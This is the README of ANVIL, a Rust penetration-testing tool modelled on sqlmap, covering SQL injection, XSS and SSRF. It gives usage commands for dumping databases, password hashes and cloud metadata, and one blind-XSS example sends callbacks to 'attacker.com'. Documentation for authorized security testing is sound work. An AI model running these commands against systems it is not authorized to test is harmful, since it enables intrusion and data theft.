# ANVIL 🔨

**Enterprise-grade Adversarial Security Testing Framework**

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org/)

ANVIL is a high-performance, comprehensive security testing tool written in Rust. It provides advanced SQL injection, XSS, and SSRF detection capabilities with features comparable to industry-standard tools like sqlmap.

## 🚀 Features

### SQL Injection (SQLi)
- **Detection Techniques**
  - UNION-based injection
  - Boolean-based blind injection
  - Time-based blind injection
  - Error-based injection
  - DNS exfiltration (Out-of-Band)
  - Second-order injection
  - Stacked queries

- **Database Enumeration**
  - Database listing (`--dbs`)
  - Table enumeration (`--tables`)
  - Column enumeration (`--columns`)
  - Data dumping (`--dump`, `--dump-all`)
  - Schema extraction (`--schema`)
  - Row counting (`--count`)

- **Database Information**
  - Banner/version (`--banner`)
  - Current user (`--current-user`)
  - Current database (`--current-db`)
  - Hostname (`--hostname`)
  - DBA check (`--is-dba`)

- **User Enumeration**
  - List users (`--users`)
  - Password hashes (`--passwords`)
  - Privileges (`--privileges`)
  - Roles (`--roles`)

- **Advanced Features**
  - 18 tamper scripts for WAF bypass
  - Interactive SQL shell
  - File read/write from server
  - OS command execution
  - Hash cracking with dictionary

- **Supported Databases**
  - MySQL / MariaDB
  - PostgreSQL
  - Microsoft SQL Server
  - Oracle
  - SQLite
  - Microsoft Access

### Cross-Site Scripting (XSS)
- Reflected XSS detection
- Stored/Persistent XSS detection
- DOM-based XSS detection
- Blind XSS with callbacks
- Context-aware payloads (HTML, attribute, JS, URL)
- Polyglot payloads

### Server-Side Request Forgery (SSRF)
- Internal network scanning (RFC1918)
- Cloud metadata endpoint testing (AWS, GCP, Azure)
- Protocol scheme testing (file, gopher, dict)
- Blind SSRF with callbacks

### Additional Features
- **Crawling**: Automatic parameter discovery
- **Fingerprinting**: Server, OS, and framework detection
- **Authentication**: Cookie and header support
- **Rate Limiting**: Configurable request throttling
- **Output Formats**: Text, JSON, CSV

## 📦 Installation

### Linux / macOS

```bash
# Clone the repository
git clone https://github.com/siddhantbhattarai/anvil.git
cd anvil

# Run the setup script
chmod +x setup.sh
./setup.sh

# Or install manually
cargo install --path .
```

### Windows

#### Option 1: Using PowerShell Script
```powershell
# Run as Administrator
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# Clone and install
git clone https://github.com/siddhantbhattarai/anvil.git
cd anvil
.\setup.ps1
```

#### Option 2: Manual Installation
1. Install [Rust](https://rustup.rs/) - Download and run `rustup-init.exe`
2. Open Command Prompt or PowerShell:
```cmd
git clone https://github.com/siddhantbhattarai/anvil.git
cd anvil
cargo install --path .
```

3. Add Cargo bin to PATH if not already:
   - Open System Properties → Environment Variables
   - Add `%USERPROFILE%\.cargo\bin` to PATH

## 🔧 Usage

### Basic SQL Injection Scan
```bash
# Detect SQLi vulnerability
anvil -t "http://target.com/page.php?id=1" -p id --sqli

# Enumerate databases
anvil -t "http://target.com/page.php?id=1" -p id --sqli --dbs

# Enumerate tables in a database
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D database_name --tables

# Enumerate columns in a table
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D database_name -T table_name --columns

# Dump table data
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D database_name -T table_name --dump

# Dump specific columns
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D database_name -T table_name -C "user,pass" --dump
```

### XSS Scanning
```bash
# Basic XSS scan
anvil -t "http://target.com/search?q=test" -p q --xss

# All XSS types
anvil -t "http://target.com/search?q=test" -p q --xss-all

# Blind XSS with callback
anvil -t "http://target.com/contact" --xss-blind --callback "attacker.com"
```

### SSRF Scanning
```bash
# Basic SSRF scan
anvil -t "http://target.com/fetch?url=http://example.com" -p url --ssrf

# Cloud metadata testing
anvil -t "http://target.com/fetch?url=test" -p url --ssrf-metadata

# All SSRF tests
anvil -t "http://target.com/fetch?url=test" -p url --ssrf-all
```

### Advanced Options
```bash
# With authentication
anvil -t "http://target.com/admin?id=1" -p id --sqli --cookie "session=abc123"

# Custom headers
anvil -t "http://target.com/api?id=1" -p id --sqli -H "Authorization: Bearer token"

# POST request
anvil -t "http://target.com/login" --data "user=admin&pass=test" -p user --sqli

# Adjust risk/level
anvil -t "http://target.com/page?id=1" -p id --sqli --level 3 --risk 2

# Output to file
anvil -t "http://target.com/page?id=1" -p id --sqli --dbs -o results.json --format json
```

## 📁 Project Structure

```
anvil/
├── src/
│   ├── main.rs              # Entry point
│   ├── cli/                 # Command-line interface
│   ├── core/                # Core engine and context
│   ├── http/                # HTTP client and requests
│   ├── sqli/                # SQL Injection module
│   │   ├── core/            # Settings, enums, queries
│   │   ├── request/         # HTTP and comparison
│   │   ├── techniques/      # Detection techniques
│   │   │   ├── union/       # UNION-based
│   │   │   ├── blind/       # Boolean/Time-based
│   │   │   ├── error/       # Error-based
│   │   │   └── dns/         # DNS exfiltration
│   │   ├── tamper/          # WAF bypass scripts
│   │   ├── shell.rs         # SQL shell
│   │   ├── file_access.rs   # File read/write
│   │   └── os_shell.rs      # OS commands
│   ├── xss/                 # XSS detection module
│   ├── ssrf/                # SSRF detection module
│   ├── scanner/             # Crawling and fingerprinting
│   ├── validation/          # Input validation
│   └── reporting/           # Output and reports
├── Cargo.toml               # Dependencies
├── setup.sh                 # Linux/macOS installer
├── setup.ps1                # Windows installer
├── LICENSE                  # Apache 2.0
└── README.md                # This file
```

## 🔒 Legal Disclaimer

This tool is intended for **authorized security testing only**. Always obtain proper authorization before testing any systems you do not own. Unauthorized access to computer systems is illegal.

The authors are not responsible for any misuse or damage caused by this tool.

## 📄 License

This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 👤 Author

**Siddhant Bhattarai**

- GitHub: [@siddhantbhattarai](https://github.com/siddhantbhattarai)

## ⭐ Acknowledgments

- Inspired by [sqlmap](https://sqlmap.org/) and other security tools
- Built with [Rust](https://www.rust-lang.org/) for performance and safety
